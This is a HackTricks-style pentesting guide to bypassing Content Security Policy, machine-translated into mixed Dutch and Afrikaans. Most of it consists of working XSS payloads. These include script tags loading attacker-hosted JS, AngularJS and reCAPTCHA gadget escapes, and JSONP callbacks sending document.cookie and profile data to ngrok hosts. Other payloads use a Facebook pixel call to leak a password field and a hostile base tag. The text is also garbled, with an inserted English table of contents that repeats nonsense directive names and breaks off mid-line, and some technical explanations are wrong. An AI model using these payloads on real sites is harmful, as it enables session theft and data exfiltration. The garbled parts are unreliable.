# Inhoudsbeveiligingsbeleid (CSP) Omzeiling

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks wilt downloaden in PDF-formaat**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**offici√´le PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Doe mee aan de** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit je aan bij de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)-server om te communiceren met ervaren hackers en bug bounty hunters!

**Inzichten in hacken**\
Ga aan de slag met inhoud die ingaat op de spanning en uitdagingen van hacken

**Real-time hacknieuws**\
Blijf op de hoogte van de snel veranderende hackwereld via realtime nieuws en inzichten

**Laatste aankondigingen**\
Blijf op de hoogte van de nieuwste bugbounties en belangrijke platformupdates

**Sluit je aan bij ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandaag nog samen te werken met top hackers!

## Wat is CSP

Content Security Policy (CSP) wordt erkend als een browsertechnologie, primair gericht op **bescherming tegen aanvallen zoals cross-site scripting (XSS)**. Het werkt door paden en bronnen te defini√´ren en te specificeren waaruit bronnen veilig door de browser kunnen worden geladen. Deze bronnen omvatten een scala aan elementen zoals afbeeldingen, frames en JavaScript. Bijvoorbeeld, een beleid kan het laden en uitvoeren van bronnen van dezelfde domeinnaam (self) toestaan, inclusief inline bronnen en de uitvoering van stringcode via functies zoals `eval`, `setTimeout` of `setInterval`.

De implementatie van CSP wordt uitgevoerd via **response headers** of door **meta-elementen in de HTML-pagina** op te nemen. Na het toepassen van dit beleid handhaven browsers deze bepalingen proactief en blokkeren ze onmiddellijk elke gedetecteerde overtreding.

- Ge√Ømplementeerd via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Ge√Ømplementeer via meta-tag:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Hierdie metatag word gebruik om 'n inhoudsveiligheidsbeleid (Content Security Policy - CSP) te implementeer. Die beleid spesifiseer watter bronne (soos skrip, style, beelde, ens.) mag gelaai word op 'n webbladsy. Die inhoud van die `content`-attribuut bevat die beleidsre√´ls wat gevolg moet word.

- Bypassing via `http-equiv` attribute:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'">
```

Hierdie voorbeeld wys hoe om die CSP te omseil deur die `http-equiv`-kenmerk te gebruik. Die beleid word ingestel om slegs skripte vanaf die huidige webwerf toe te laat, maar die `unsafe-inline`-waarde laat enige skripte toe, selfs as dit nie vanaf die huidige webwerf afkomstig is nie.

- Bypassing via `sandbox` attribute:

```html
<iframe src="https://example.com" sandbox="allow-scripts"></iframe>
```

Hierdie voorbeeld wys hoe om die CSP te omseil deur die `sandbox`-kenmerk te gebruik. Die `sandbox`-waarde van `allow-scripts` laat toe dat skripte binne die `iframe`-element uitgevoer word, selfs as dit teenstrydig is met die beleid van die omliggende webbladsy.

- Bypassing via `data:` URL:

```html
<script src="data:text/javascript;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script>
```

Hierdie voorbeeld wys hoe om die CSP te omseil deur die `data:`-URL-skema te gebruik. Die skripskakel verwys na 'n data-URL wat die skripskode bevat. Hierdie omseiling laat toe dat die skripskode uitgevoer word, selfs as dit nie toegelaat word volgens die beleid nie.

- Bypassing via `nonce` attribute:

```html
<script src="https://example.com/script.js" nonce="abc123"></script>
```

Hierdie voorbeeld wys hoe om die CSP te omseil deur die `nonce`-kenmerk te gebruik. Die `nonce`-waarde moet ooreenstem met die waarde wat deur die webwerf se beleid gespesifiseer word. Hierdie omseiling laat toe dat die skripskakel gelaai word, selfs as dit nie toegelaat word volgens die beleid nie.
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Koptekste

CSP kan afgedwing of gemonitor word deur middel van hierdie koptekste:

* `Content-Security-Policy`: Dwang die CSP af; die blaaier blokkeer enige oortredings.
* `Content-Security-Policy-Report-Only`: Word gebruik vir monitering; rapporteer oortredings sonder om dit te blokkeer. Ideaal vir toetsing in pre-produksie omgewings.

### Definisie van Hulpbronne

CSP beperk die oorspronge vir die laai van beide aktiewe en passiewe inhoud, en beheer aspekte soos inline JavaScript-uitvoering en die gebruik van `eval()`. 'n Voorbeeldbeleid is:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Riglyne

* **script-src**: Laat spesifieke bronne toe vir JavaScript, insluitend URL's, inline skripte en skripte wat geaktiveer word deur gebeurtenishanterers of XSLT-stylblaaie.
* **default-src**: Stel 'n verstekbeleid in vir die ophaling van hulpbronne wanneer spesifieke ophalingsriglyne afwesig is.
* **child-src**: Spesifiseer toegelate hulpbronne vir webwerkers en ingebedde raaminhoud.
* **connect-src**: Beperk URL's wat gelaai kan word met behulp van koppelvlakke soos fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Beperk URL's vir rame.
* **frame-ancestors**: Spesifiseer watter bronne die huidige bladsy kan insluit, van toepassing op elemente soos `<frame>`, `<iframe>`, `<object>`, `<embed>` en `<applet>`.
* **img-src**: Definieer toegelate bronne vir afbeeldings.
* **font-src**: Spesifiseer geldige bronne vir lettertipes wat gelaai word met behulp van `@font-face`.
* **manifest-src**: Definieer toegelate bronne van aansoek-manifestl√™ers.
* **media-src**: Definieer toegelate bronne vir die laai van media-objekte.
* **object-src**: Definieer toegelate bronne vir `<object>`, `<embed>` en `<applet>` elemente.
* **base-uri**: Spesifiseer toegelate URL's vir laai met behulp van `<base>` elemente.
* **form-action**: Lys geldige eindpunte vir vormindienings.
* **plugin-types**: Beperk mime-tipes wat 'n bladsy kan aanroep.
* **upgrade-insecure-requests**: Gee aan dat webblaaier HTTP-URL's na HTTPS moet omskakel.
* **sandbox**: Pas beperkings toe soortgelyk aan die sandbox-eienskap van 'n `<iframe>`.
* **report-to**: Spesifiseer 'n groep waaraan 'n verslag gestuur sal word as die beleid oortree word.
* **worker-src**: Spesifiseer geldige bronne vir werker-, gedeelde werker- of dienswerkerskripte.
* **prefetch-src**: Spesifiseer geldige bronne vir hulpbronne wat gelaai of voorgelaai sal word.
* **navigate-to**: Beperk die URL's waarna 'n dokument op enige manier kan navigeer (a, vorm, window.location, window.open, ens.)


### Bronne

* `*`: Laat alle URL's toe behalwe di√© met die `data:`, `blob:` en `filesystem:` skemas.
* `'self'`: Laat laai vanaf dieselfde domein toe.
* `'data'`: Laat hulpbronne toe om gelaai te word via die data-skema (bv. Base64-gekodeerde afbeeldings).
* `'none'`: Blokkeer laai vanaf enige bron.
* `'unsafe-eval'`: Laat die gebruik van `eval()` en soortgelyke metodes toe, nie aanbeveel vir veiligheidsredes nie.
* `'unsafe-hashes'`: Maak spesifieke inline-gebeurtenishanterers moontlik.
* `'unsafe-inline'`: Laat die gebruik van inline-hulpbronne soos inline `<script>` of `<style>` toe, nie aanbeveel vir veiligheidsredes nie.
* `'nonce'`: 'n Witlys vir spesifieke inline-skripte wat 'n kriptografiese nonce (eenmalige getal) gebruik.
* `'sha256-<hash>'`: Witlys skripte met 'n spesifieke sha256-hash.
* `'strict-dynamic'`: Laat laai van skripte vanaf enige bron toe as dit deur 'n nonce of hash op die witlys geplaas is.
* `'host'`: Spesifiseer 'n spesifieke gasheer, soos `example.com`.
* `https:`: Beperk URL's tot di√© wat HTTPS gebruik.
* `blob:`: Laat hulpbronne toe om gelaai te word vanaf Blob-URL's (bv. Blob-URL's wat deur JavaScript geskep is).
* `filesystem:`: Laat hulpbronne toe om gelaai te word vanaf die l√™ersisteem.
* `'report-sample'`: Sluit 'n voorbeeld van die oortredende kode in die oortredingsverslag in (nuttig vir foutopsporing).
* `'strict-origin'`: Soortgelyk aan 'self', maar verseker dat die protokol-sekuriteitsvlak van die bronne ooreenstem met die dokument (slegs veilige oorspronge kan hulpbronne van veilige oorspronge laai).
* `'strict-origin-when-cross-origin'`: Stuur volledige URL's wanneer dieselfde-oorsprong-aanvrae gedoen word, maar stuur slegs die oorsprong wanneer die aanvraag kruis-oorsprong is.
* `'unsafe-allow-redirects'`: Laat hulpbronne toe wat onmiddellik na 'n ander hulpbron sal omskakel. Nie aanbeveel nie, omdat dit die veiligheid verswak.
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Werkende payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Werkende lading:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### streng-dinamies

As jy op een of ander manier 'n **toegelate JS-kode 'n nuwe skriptiket in die DOM kan laat skep** met jou JS-kode, omdat 'n toegelate skrip dit skep, sal die **nuwe skriptiket toegelaat word om uitgevoer te word**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Werkende lading:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Gebrek aan object-src en default-src

{% hint style="danger" %}
**Dit lyk nie meer asof dit werk nie**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Werkende payloads:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### L√™eroplaai + 'self'

Die `self` sleutelwoord in 'n Content Security Policy (CSP) stel die bron van 'n webbladsy se inhoud voor. Dit word gebruik om te bepaal watter bronne toegelaat word om gelae te word deur die webbladsy. As 'n webbladsy 'n CSP beleid het wat die `self` sleutelwoord gebruik, beteken dit dat slegs bronne van dieselfde oorsprong as die webbladsy toegelaat word.

Hierdie beperking kan egter omseil word deur 'n l√™eroplaai-aanval uit te voer. Die aanvaller kan 'n l√™er op die webwerf oplaai en dit dan gebruik as 'n bron vir die webbladsy. Aangesien die l√™er van dieselfde oorsprong as die webbladsy is, sal dit toegelaat word volgens die `self` beleid.

Dit kan 'n ernstige veiligheidsrisiko veroorsaak, aangesien 'n aanvaller skadelike l√™ers kan oplaai en uitvoer op die webwerf. Dit kan lei tot die uitvoering van skadelike kodes op die webwerf, die lek van gevoelige inligting of selfs die oorneem van die webwerf.

Om hierdie tipe aanval te voorkom, moet die webwerf behoorlike verifikasie en validering van l√™eroplaai-aanvrae uitvoer. Dit kan insluit die gebruik van l√™eruitbreidingbeperkings, l√™ergroottebeperkings, inhoudstipeverifikasie en die skandering van opgelaaide l√™ers vir skadelike inhoud.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
As jy 'n JS-l√™er kan oplaai, kan jy hierdie CSP omseil:

Werkende payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Dit is egter baie waarskynlik dat die bediener die opgelaaide l√™er **valideer** en slegs toelaat dat jy 'n **bepaalde tipe l√™ers** oplaai.

Selfs as jy 'n **JS-kode binne** 'n l√™er kon oplaai deur 'n aanvaarde uitbreiding deur die bediener te gebruik (soos: _script.png_), sal dit nie genoeg wees nie, omdat sommige bedieners soos Apache-bedieners die **MIME-tipe van die l√™er kies op grond van die uitbreiding** en webblaaier soos Chrome sal **weier om Javascript-kode** binne iets wat 'n prent behoort te wees, uit te voer. "Hopelik" is daar foute. Byvoorbeeld, van 'n CTF het ek geleer dat **Apache nie** die _**.wave**_ uitbreiding ken nie, daarom bedien dit dit nie met 'n **MIME-tipe soos audio/\*** nie.

Van hier af, as jy 'n XSS en 'n l√™eroplaai vind, en jy slaag daarin om 'n **verkeerd ge√Ønterpreteerde uitbreiding** te vind, kan jy probeer om 'n l√™er met daardie uitbreiding en die inhoud van die skrip op te laai. Of, as die bediener die korrekte formaat van die opgelaaide l√™er nagaan, skep 'n poliglot ([sommige poliglot-voorbeelde hier](https://github.com/Polydet/polyglot-database)).

### Derde Party Eindpunte + ('unsafe-eval')

{% hint style="warning" %}
Vir sommige van die volgende payload is **`unsafe-eval` nie eens nodig nie**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Laai 'n kwesbare weergawe van Angular en voer willekeurige JS uit:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads wat Angular gebruik + 'n biblioteek met funksies wat die `window`-objek teruggee ([kyk na hierdie pos](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Die pos wys dat jy al die biblioteke van `cdn.cloudflare.com` (of enige ander toegelate JS-biblioteek-repo) kan **laai**, al die bygevoegde funksies van elke biblioteek kan uitvoer, en **ondersoek watter funksies van watter biblioteke die `window`-objek teruggee**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Misbruik van Google reCAPTCHA JS-kode

Volgens [**hierdie CTF-verslag**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=af&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) kan jy [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) binne 'n CSP misbruik om willekeurige JS-kode uit te voer en die CSP te omseil:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Derde Party Eindpunte + JSONP

JSONP (JSON met padding) is 'n tegniek wat gebruik kan word om 'n Content Security Policy (CSP) te omseil wat die gebruik van derde party eindpunte beperk. JSONP maak gebruik van 'n skript tag om 'n GET-versoek na 'n derde party eindpunt te stuur en die respons in te sluit as 'n funksie-oproep. Hierdie tegniek maak dit moontlik om data van 'n derde party eindpunt te verkry sonder om die CSP te oortree.

Om JSONP te gebruik, moet die derde party eindpunt 'n funksie-oproep terugstuur wat die data bevat. Die funksie-oproep moet die data as 'n argument aanroep, byvoorbeeld:

```javascript
callbackFunction({"data": "example"});
```

Die funksie-oproep moet ook 'n unieke funksie-naam gebruik om te verseker dat dit nie bots met ander funksies in die toepassing nie.

Om JSONP te gebruik om 'n CSP te omseil, kan jy 'n skript tag in jou HTML-inhoud insluit wat verwys na die derde party eindpunt en die funksie-naam spesifiseer wat jy wil gebruik om die data te verwerk. Byvoorbeeld:

```html
<script src="https://thirdparty.com/api?callback=callbackFunction"></script>
```

Wanneer die skript tag uitgevoer word, sal dit 'n GET-versoek na die derde party eindpunt stuur en die respons sal as 'n funksie-oproep aanroep word met die opgegee funksie-naam. Die data wat deur die derde party eindpunt teruggestuur word, sal as 'n argument aan die funksie-oproep oorgedra word.

Hierdie tegniek maak dit moontlik om data van 'n derde party eindpunt te verkry sonder om die CSP te oortree, aangesien die data as 'n skript tag ingesluit word en nie as 'n AJAX-versoek nie.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenarios soos hierdie waar `script-src` ingestel is op `self` en 'n spesifieke domein wat op die witlys staan, kan omseil word deur gebruik te maak van JSONP. JSONP-eindpunte maak gebruik van onveilige terugroepmetodes wat 'n aanvaller in staat stel om XSS uit te voer. Werkende payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **bevat gereed om te gebruik JSONP-eindpunten om CSP-bypass van verskillende webwerwe uit te voer.**

Dieselfde kwesbaarheid sal voorkom as die **vertroude eindpunt 'n oop omleiding bevat**, want as die aanvanklike eindpunt vertrou word, word omleidings vertrou.

### Misbruik deur Derde Partye
Soos beskryf in die [volgende pos](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), is daar baie derde party-domeine wat dalk toegelaat word in die CSP en misbruik kan word om data uit te lek of JavaScript-kode uit te voer. Sommige van hierdie derde partye is:

| Entiteit | Toegelate Domein | Vermo√´ns |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Uitlek |
| Hotjar | *.hotjar.com, ask.hotjar.io | Uitlek |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Uitvoer |
| Amazon CloudFront | *.cloudfront.net | Uitlek, Uitvoer |
| Amazon AWS | *.amazonaws.com | Uitlek, Uitvoer |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Uitlek, Uitvoer |
| Salesforce Heroku	| *.herokuapp.com | Uitlek, Uitvoer |
| Google Firebase | *.firebaseapp.com | Uitlek, Uitvoer |

As jy enige van die toegelate domeine in die CSP van jou teiken vind, is daar 'n kans dat jy die CSP kan omseil deur te registreer by die derde-party-diens en √≥f data na daardie diens uit te lek √≥f kode uit te voer.

Byvoorbeeld, as jy die volgende CSP vind:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
# Content Security Policy (CSP) Bypass

## Introduction

Content Security Policy (CSP) is a security mechanism implemented by web applications to mitigate the risk of cross-site scripting (XSS) attacks. CSP allows web developers to specify which resources (such as scripts, stylesheets, and images) are allowed to be loaded and executed on a web page. This helps prevent the execution of malicious code injected by attackers.

However, CSP can sometimes be misconfigured or bypassed, allowing attackers to circumvent its protections. In this guide, we will explore various techniques to bypass CSP and execute arbitrary code on a target web application.

## Table of Contents

- [CSP Bypass Techniques](#csp-bypass-techniques)
  - [Inline Script Execution](#inline-script-execution)
  - [Data: URL Execution](#data-url-execution)
  - [Unsafe Inline and Eval](#unsafe-inline-and-eval)
  - [Nonce Bypass](#nonce-bypass)
  - [CSP Header Manipulation](#csp-header-manipulation)
  - [CSP Report-Only Mode](#csp-report-only-mode)
  - [CSP Sandbox Directive](#csp-sandbox-directive)
  - [CSP Frame Ancestors Directive](#csp-frame-ancestors-directive)
  - [CSP Plugin Types Directive](#csp-plugin-types-directive)
  - [CSP Upgrade-Insecure-Requests Directive](#csp-upgrade-insecure-requests-directive)
  - [CSP Block-All-Mixed-Content Directive](#csp-block-all-mixed-content-directive)
  - [CSP Referrer Directive](#csp-referrer-directive)
  - [CSP Require-SRI-For Directive](#csp-require-sri-for-directive)
  - [CSP Trusted Types Directive](#csp-trusted-types-directive)
  - [CSP Worker-Src Directive](#csp-worker-src-directive)
  - [CSP Manifest-Src Directive](#csp-manifest-src-directive)
  - [CSP Frame-Src Directive](#csp-frame-src-directive)
  - [CSP Navigate-To Directive](#csp-navigate-to-directive)
  - [CSP Report-To Directive](#csp-report-to-directive)
  - [CSP Require-Trusted-Types-For Directive](#csp-require-trusted-types-for-directive)
  - [CSP Require-Corp Directive](#csp-require-corp-directive)
  - [CSP Require-Honest-Reporting Directive](#csp-require-honest-reporting-directive)
  - [CSP Require-Signed-Exchange Directive](#csp-require-signed-exchange-directive)
  - [CSP Require-Canonical Directive](#csp-require-canonical-directive)
  - [CSP Require-Canonical-With-Default Directive](#csp-require-canonical-with-default-directive)
  - [CSP Require-Canonical-With-Default-Ref Directive](#csp-require-canonical-with-default-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref Directive](#csp-require-canonical-with-default-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-and-ref-directive)
  - [CSP Require-Canonical-With-Default-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-Ref-And-
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Jy behoort in staat te wees om data uit te voer, soortgelyk aan hoe dit altyd gedoen is met [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). In hierdie geval volg jy hierdie algemene stappe:

1. Skep 'n Facebook Developer-rekening hier.
1. Skep 'n nuwe "Facebook Login" app en kies "Webwerf".
1. Gaan na "Instellings -> Basies" en kry jou "App ID".
1. In die teikensite waarvan jy data wil uitvoer, kan jy data uitvoer deur direk die Facebook SDK-gadget "fbq" te gebruik deur 'n "customEvent" en die datapakket.
1. Gaan na jou App "Eventbestuurder" en kies die toepassing wat jy geskep het (let op dat die eventbestuurder gevind kan word in 'n URL soortgelyk aan hierdie: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events).
1. Kies die "Toetsgebeurtenisse"-oortjie om die gebeurtenisse te sien wat deur "jou" webwerf uitgestuur word.

Dan, aan die slagofferkant, voer jy die volgende kode uit om die Facebook volgpixel te inisialiseer om na die aanvaller se Facebook-ontwikkelaarrekening se app-id te verwys en 'n custom gebeurtenis uit te reik soos hierdie:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
Wat die ander sewe derde-party domeine betref wat in die vorige tabel gespesifiseer is, is daar baie ander maniere waarop jy hulle kan misbruik. Verwys na die vorige [blogpos](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) vir addisionele verduidelikings oor ander derde-party misbruik.

### Omseiling deur middel van RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Naas die vooraf genoemde omleiding om padbeperkings te omseil, is daar 'n ander tegniek genaamd Relative Path Overwrite (RPO) wat op sommige bedieners gebruik kan word.

Byvoorbeeld, as CSP die pad `https://example.com/scripts/react/` toelaat, kan dit so omseil word:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Die blaaier sal uiteindelik `https://example.com/scripts/angular/angular.js` laai.

Dit werk omdat vir die blaaier, laai jy 'n l√™er genaamd `..%2fangular%2fangular.js` wat gele√´ is onder `https://example.com/scripts/react/`, wat voldoen aan CSP.

‚àë, sal hulle dit ontsleutel, en effektief `https://example.com/scripts/react/../angular/angular.js` aanvra, wat gelykstaande is aan `https://example.com/scripts/angular/angular.js`.

Deur **hierdie teenstrydigheid in URL-interpretasie tussen die blaaier en die bediener uit te buit, kan die padre√´ls omseil** word.

Die oplossing is om `%2f` nie as `/` aan die bedienerkant te hanteer nie, om sodoende 'n konsekwente interpretasie tussen die blaaier en die bediener te verseker en hierdie probleem te vermy.

Aanlyn Voorbeeld: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS-uitvoering

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### ontbrekende **base-uri**

As die **base-uri** riglyn ontbreek, kan jy dit misbruik om 'n [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) uit te voer.

Verder, as die **bladsy 'n skrip laai deur 'n relatiewe pad** te gebruik (soos `<script src="/js/app.js">`) deur 'n **Nonce**, kan jy die **base** **tag** misbruik om dit te laat **laai** die skrip vanaf **jou eie bediener en 'n XSS te bereik.**\
As die kwesbare bladsy met **httpS** gelaai word, gebruik 'n httpS-url in die basis.
```html
<base href="https://www.attacker.com/">
```
### AngularJS gebeure

